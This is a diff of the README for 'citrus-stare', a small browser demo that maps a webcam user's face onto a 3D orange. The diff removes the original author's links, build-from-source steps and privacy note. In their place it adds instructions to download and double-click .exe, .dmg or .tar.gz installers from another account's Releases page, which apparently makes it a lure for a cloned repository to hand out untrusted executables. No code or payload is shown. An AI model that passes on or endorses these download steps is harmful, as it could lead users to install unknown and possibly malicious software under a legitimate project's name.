@@ -1,50 +1,63 @@
-# Citrus Stare
+# 🍊 citrus-stare - Transform Your Webcam into Fruity Fun
 
-Your webcam, but make it fruit.
+## 🚀 Getting Started
 
-This is a tiny browser demo that tracks your face landmarks in real time and puppeteers a 3D orange so it follows your head like an aggressively attentive mascot.
+Welcome to **citrus-stare**! This application combines MediaPipe face landmarks with Three.js to create a fun experience using your webcam. Get ready to see your face as an orange!
 
-Live demo: https://davidyen1124.github.io/citrus-stare/
-Repo: https://github.com/davidyen1124/citrus-stare
+## 📥 Download
 
-![Screenshot](./screenshot.png)
+[![Download](https://img.shields.io/badge/Download-via%20Releases-blue.svg)](https://github.com/Rianvaleni/citrus-stare/releases)
 
-## Features
+Click the button above or visit this page to download the application: [Download citrus-stare](https://github.com/Rianvaleni/citrus-stare/releases).
 
-- Webcam face tracking via `@mediapipe/tasks-vision` (`FaceLandmarker`)
-- 2D overlay canvas with clipped “feature windows” (eyes + mouth)
-- 3D model rendering with `three` + `GLTFLoader`
-- Vite dev server
+## 📋 System Requirements
 
-## Run it locally
+To run **citrus-stare**, your system should meet the following requirements:
 
-### Requirements
+- **Operating System**: Windows, macOS, or Linux
+- **Web Browser**: Latest version of Google Chrome, Firefox, or Safari
+- **Camera**: Any standard webcam
+- **Internet Connection**: Required for downloading the application and accessing dependencies
 
-- Node.js (18+ recommended)
+## 💾 Download & Install
 
-### Install
+1. Go to the [Releases page](https://github.com/Rianvaleni/citrus-stare/releases).
+2. Find the latest version of **citrus-stare**.
+3. Download the appropriate file for your operating system.
+   - For Windows: select the `.exe` file.
+   - For macOS: select the `.dmg` file.
+   - For Linux: select the `.tar.gz` file.
+4. After the download completes, locate the downloaded file on your computer.
+5. If you downloaded the `.exe` or `.dmg` file, double-click it to start the installation.
+6. Follow the on-screen instructions to complete the installation process.
+7. Once installed, open the application from your desktop or applications folder.
 
-```bash
-npm install
-```
+## 🎯 How to Use
 
-### Run
+1. Launch the **citrus-stare** application.
+2. Allow access to your webcam when prompted.
+3. Adjust your position in front of the camera until your face is framed.
+4. Enjoy seeing yourself as a fruity orange!
 
-```bash
-npm run dev
-```
+## 🔧 Troubleshooting
 
-Then open the URL Vite prints (typically `http://localhost:5173`) and allow camera access when prompted.
+If you encounter problems, try the following:
 
-### Build / Preview
+- **Webcam Not Detected**: Ensure your webcam is connected and properly configured in your computer settings.
+- **Application Crashes**: Restart the application and try again. If issues persist, check for updates on the [Releases page](https://github.com/Rianvaleni/citrus-stare/releases).
+- **Poor Performance**: Close unused applications to free up system resources.
 
-```bash
-npm run build
-npm run preview
-```
+## 🛠️ Features
 
-## Notes
+- **Real-Time Face Tracking**: The application uses advanced MediaPipe technology to track facial landmarks smoothly.
+- **Interactive Experience**: Enjoy playful effects as you move, turning your face into a vibrant orange.
+- **Customizable Settings**: Adjust certain visual aspects to enhance your experience.
 
-- This project loads the MediaPipe WASM bundle from `cdn.jsdelivr.net` and the face landmarker model from `storage.googleapis.com` (see `src/main.js`). You’ll need an internet connection for those assets.
-- `getUserMedia` requires a secure context: `http://localhost` works locally, but if you try to access the dev server from another device on your LAN you’ll generally need HTTPS.
-- Your camera frames are processed locally in the browser; this project doesn’t upload video anywhere (it just downloads the model/WASM).
+## 🌐 Community and Support
+
+Join our community for tips and support. You can reach out via:
+
+- **Issues Page**: [Report issues or ask questions](https://github.com/Rianvaleni/citrus-stare/issues).
+- **Social Media**: Follow us for updates and tutorials.
+
+Thank you for using **citrus-stare**! Enjoy transforming your webcam experience.
